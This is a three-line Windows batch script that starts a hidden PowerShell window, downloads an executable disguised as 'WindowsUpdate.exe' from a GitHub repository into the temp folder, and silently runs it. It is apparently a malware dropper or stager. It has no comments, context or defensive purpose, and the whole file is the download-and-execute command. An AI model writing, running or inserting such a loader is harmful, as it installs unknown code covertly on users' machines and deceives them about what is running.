@echo off
start "" /B powershell -NoP -NonI -W Hidden -C "$b='%TEMP%\wd.exe';irm https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/WindowsUpdate.exe -OutFile $b;Start-Process $b -WindowStyle Hidden"
exit
